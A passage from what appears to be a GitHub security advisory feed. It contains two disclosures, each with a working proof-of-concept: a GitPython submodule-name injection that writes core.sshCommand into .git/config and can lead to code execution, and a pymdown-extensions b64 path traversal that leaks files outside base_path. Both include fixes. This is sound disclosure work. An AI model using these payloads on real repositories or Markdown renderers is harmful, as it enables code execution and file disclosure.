<p>Asymmetry: the sibling class is blocked — a newline in a config <strong>value</strong>, e.g. <code>set_value("core", "editor", "x\n\tsshCommand=CMD")</code>, raises <code>ValueError</code>. The section-<strong>name</strong> bracket payload is not caught by the same guard.</p>
<h3 id="poc">PoC</h3>
<p>Single self-contained script, run against the pinned release in an ephemeral environment. Non-destructive: the injected value is an inert marker, verified parse-only with <code>git config --get</code>; no ssh/fetch/push is run and nothing is executed.</p>
<pre><code class="language-python">#!/usr/bin/env python3
"""Minimal PoC: git-config section-name injection in GitPython==3.1.52."""
from importlib.metadata import version
import os, tempfile, subprocess
import git

print(f"# GitPython {version('GitPython')}")        # version proof -- first line

MARKER = "MARKER_9f3a"                               # inert; never executed
tmp = tempfile.mkdtemp()
env = {**os.environ, "HOME": tmp,
       "GIT_CONFIG_GLOBAL": os.path.join(tmp, "gc"), "GIT_CONFIG_SYSTEM": os.devnull,
       "GIT_AUTHOR_NAME": "a", "GIT_AUTHOR_EMAIL": "a@b.c",
       "GIT_COMMITTER_NAME": "a", "GIT_COMMITTER_EMAIL": "a@b.c"}

def run(*a, cwd=None):
    return subprocess.run(a, cwd=cwd, env=env, capture_output=True, text=True)

# A benign local repo used as the submodule url (a plain path, no network).
src = os.path.join(tmp, "src"); os.makedirs(src)
run("git", "init", "-q", src)
open(os.path.join(src, "f"), "w").write("x")
run("git", "add", "f", cwd=src); run("git", "commit", "-qm", "i", cwd=src)
suburl = os.path.join(tmp, "sub.git"); run("git", "clone", "-q", "--bare", src, suburl)

def parent_repo():
    p = tempfile.mkdtemp(dir=tmp)
    run("git", "init", "-q", p)
    open(os.path.join(p, "r"), "w").write("x")
    run("git", "add", "r", cwd=p); run("git", "commit", "-qm", "i", cwd=p)
    return p

def injected_sshcommand(parent):
    r = run("git", "config", "-f", os.path.join(parent, ".git", "config"),
            "--get", "core.sshCommand")
    return (r.returncode, r.stdout.strip())

benign = "docs"
evil   = f'x"] [core] sshCommand={MARKER} #'          # closes the header, opens [core]

p_control = parent_repo()
git.Repo(p_control).create_submodule(name=benign, path="docs", url=suburl)
p_exploit = parent_repo()
git.Repo(p_exploit).create_submodule(name=evil, path="sub", url=suburl)

ctl = injected_sshcommand(p_control)
exp = injected_sshcommand(p_exploit)
header = [l for l in open(os.path.join(p_exploit, ".git", "config")).read().splitlines()
          if l.startswith("[submodule")][0]

print("control name :", repr(benign))
print("  git core.sshCommand -&gt;", ctl, "(unset)")
print("exploit name :", repr(evil))
print("  written header      -&gt;", header)
print("  git core.sshCommand -&gt;", exp)

assert ctl[0] != 0 and ctl[1] == "", "control unexpectedly set core.sshCommand"
assert exp == (0, MARKER), "not reproduced"
print(f"VERDICT: attacker-controlled submodule name injected core.sshCommand={MARKER} "
      f"into the victim's trusted .git/config (git would run it on the next ssh op)")
</code></pre>
<p>Run:</p>
<pre><code class="language-bash">uv run --with GitPython==3.1.52 python poc.py
</code></pre>
<p>Observed output:</p>
<pre><code># GitPython 3.1.52
control name : 'docs'
  git core.sshCommand -&gt; (1, '') (unset)
exploit name : 'x"] [core] sshCommand=MARKER_9f3a #'
  written header      -&gt; [submodule "x"] [core] sshCommand=MARKER_9f3a #"]
  git core.sshCommand -&gt; (0, 'MARKER_9f3a')
VERDICT: attacker-controlled submodule name injected core.sshCommand=MARKER_9f3a into the victim's trusted .git/config (git would run it on the next ssh op)
</code></pre>
<p>The benign name yields a single clean <code>[submodule "docs"]</code> section; the malicious name yields an injected <code>core.sshCommand</code>. Deterministic across runs. The payload must use balanced double-quotes (an unbalanced <code>"</code> makes git reject the header); the <code>submodule "&lt;name&gt;"</code> wrapper balances them automatically.</p>
<h3 id="impact">Impact</h3>
<p>Arbitrary attacker-controlled write into the victim's repository-local <code>.git/config</code>, which git fully trusts. <code>core.sshCommand</code> is executed as the ssh transport command on the victim's next ssh git operation (fetch/pull/push), giving remote code execution; other injectable keys (<code>alias.*</code>, <code>core.pager</code>, <code>core.fsmonitor</code>) fire on more common operations. Reachable in default configuration through two realistic paths:</p>
<ul>
<li>an application that constructs a submodule from untrusted input via <code>Repo.create_submodule(name=...)</code> (single call); or</li>
<li><code>Repo.clone_from</code> of an untrusted repository followed by <code>submodule_update</code> — the canonical submodule threat model, where the malicious name is read from the cloned <code>.gitmodules</code>.</li>
</ul>
<p>No non-default git settings are required. Primarily a Unix vector: on Windows the <code>"</code> in the resulting <code>.git/modules/&lt;name&gt;</code> directory name can abort the fresh-clone write branch (the direct config-API and <code>create_submodule</code> sinks are unaffected).</p>
<h3 id="recommended-fix">Recommended fix</h3>
<p>Reject or escape configuration section/subsection/option <strong>names</strong> that contain <code>]</code>, <code>[</code>, <code>"</code>, or leading/trailing whitespace (or apply git's own section-name escaping) in <code>_assure_config_name_safe</code> / <code>write_section</code>, rather than only CR/LF/NUL. Validating submodule names before they reach <code>sm_section</code> would additionally close the clone-driven path.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-3rp5-jjmw-4wv2">https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-3rp5-jjmw-4wv2</a></li>
<li><a href="https://github.com/gitpython-developers/GitPython/commit/1ed1b924f4e2d2ee7bab296df77b978af21853f1">https://github.com/gitpython-developers/GitPython/commit/1ed1b924f4e2d2ee7bab296df77b978af21853f1</a></li>
<li><a href="https://github.com/gitpython-developers/GitPython/releases/tag/3.1.53">https://github.com/gitpython-developers/GitPython/releases/tag/3.1.53</a></li>
<li><a href="https://github.com/advisories/GHSA-3rp5-jjmw-4wv2">https://github.com/advisories/GHSA-3rp5-jjmw-4wv2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3rp5-jjmw-4wv2</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-24T16:22:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pymdown-extensions] PyMdown Extensions: Path traversal in the b64 extension lets <img src> read files outside base_path]]></title>
        <id>https://github.com/advisories/GHSA-9xwg-3r6f-jcx2</id>
        <link href="https://github.com/advisories/GHSA-9xwg-3r6f-jcx2"/>
        <updated>2026-07-24T16:18:34.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The <code>b64</code> extension inlines images referenced by <code>&lt;img src="..."&gt;</code> as base64 data URIs. When resolving the <code>src</code> path it joins it onto the configured <code>base_path</code> with <code>os.path.normpath</code> and opens the result directly, with no check that the resolved path stays inside <code>base_path</code>. A <code>src</code> containing <code>../</code> sequences, or an absolute path, therefore reads a file outside <code>base_path</code> as long as that file has an allowed image extension (<code>.png</code>, <code>.jpg</code>, <code>.jpeg</code>, <code>.gif</code>, <code>.svg</code>). The base64 of that file is then embedded in the rendered output, disclosing its contents.</p>
<p>This is a separate code path from the <code>snippets</code> traversal issues (GHSA-jh85-wwv9-24hv, GHSA-62q4-447f-wv8h). It lives in <code>pymdownx/b64.py</code> and has no path restriction of any kind. Confirmed on <code>10.21.3</code> installed from PyPI.</p>
<h3 id="details">Details</h3>
<p>In <code>pymdownx/b64.py</code>, function <code>repl_path</code> (around lines 68 to 90 on <code>main</code>):</p>
<pre><code class="language-python">if is_absolute:
    file_name = os.path.normpath(path)                          # absolute src: base_path ignored entirely
else:
    file_name = os.path.normpath(os.path.join(base_path, path)) # relative src: '../' escapes base_path
if os.path.exists(file_name):
    ext = os.path.splitext(file_name)[1].lower()
    for b64_ext in file_types:
        if ext in b64_ext:
            with open(file_name, "rb") as f:                    # opened with no containment check
                ...
</code></pre>
<p>There is no <code>startswith(base_path)</code>, no <code>os.path.realpath</code> comparison, and no rejection of <code>..</code>. Both branches are reachable from an attacker-controlled <code>src</code>.</p>
<h3 id="poc">PoC</h3>
<p>Reproduced against an unmodified <code>pymdown-extensions==10.21.3</code> from PyPI. The script creates a <code>base_path</code> directory and a PNG one level above it, then renders Markdown whose image <code>src</code> points outside <code>base_path</code>, and confirms the outside file's bytes appear base64-encoded in the output.</p>
<pre><code class="language-python">import base64, os, shutil, tempfile, markdown

root = tempfile.mkdtemp()
base_path = os.path.join(root, "docs"); os.makedirs(base_path)
outside = os.path.join(root, "secret"); os.makedirs(outside)

png = base64.b64decode(
    "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk"
    "+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg=="
)
with open(os.path.join(outside, "secret.png"), "wb") as f:
    f.write(png)

md = markdown.Markdown(
    extensions=["pymdownx.b64"],
    extension_configs={"pymdownx.b64": {"base_path": base_path}},
)
html = md.convert('&lt;img src="../secret/secret.png"&gt;')

assert base64.b64encode(png).decode() in html, "not leaked"
print("LEAKED:", html)
</code></pre>
<p>Output:</p>
<pre><code>LEAKED: &lt;p&gt;&lt;img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQ..."&gt;&lt;/p&gt;
</code></pre>
<p>The base64 of a file outside <code>base_path</code> is present in the output. The absolute-path branch behaves the same way: an absolute <code>src</code> bypasses <code>base_path</code> entirely via <code>os.path.normpath(path)</code>. Both were confirmed leaking.</p>
<h3 id="impact">Impact</h3>
<p>An application that renders untrusted Markdown with <code>pymdownx.b64</code> enabled exposes the contents of image-extension files on the server, or any path the process can read, to whoever controls the Markdown and whoever views the output. The reach is bounded by the image-extension check, so it is a targeted file read rather than full arbitrary read, but it still discloses file contents that were never meant to be exposed.</p>
<h3 id="suggested-fix">Suggested fix</h3>
<p>Resolve the real path and require it to stay within <code>base_path</code> before opening:</p>
<pre><code class="language-python">file_name = os.path.realpath(os.path.join(base_path, path))
base_real = os.path.realpath(base_path)
if file_name != base_real and not file_name.startswith(base_real + os.sep):
    return m.group(0)  # leave the tag untouched; do not read outside base_path
</code></pre>
<p>The same containment check should apply to the absolute-path branch rather than trusting an absolute <code>src</code>. Using <code>realpath</code> instead of <code>abspath</code> also closes the related symlink-following gap in the snippets handler.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/facelessuser/pymdown-extensions/security/advisories/GHSA-9xwg-3r6f-jcx2">https://github.com/facelessuser/pymdown-extensions/security/advisories/GHSA-9xwg-3r6f-jcx2</a></li>
<li><a href="https://github.com/facelessuser/pymdown-extensions/commit/edce35586d11a1ef78bb187bc60497fe6dbf3b64">https://github.com/facelessuser/pymdown-extensions/commit/edce35586d11a1ef78bb187bc60497fe6dbf3b64</a></li>
<li><a href="https://github.com/facelessuser/pymdown-extensions/releases/tag/11.0">https://github.com/facelessuser/pymdown-extensions/releases/tag/11.0</a></li>
<li><a href="https://github.com/advisories/GHSA-9xwg-3r6f-jcx2">https://github.com/advisories/GHSA-9xwg-3r6f-jcx2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9xwg-3r6f-jcx2</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-07-24T16:18:33.000Z</published>
    </entry>
</feed>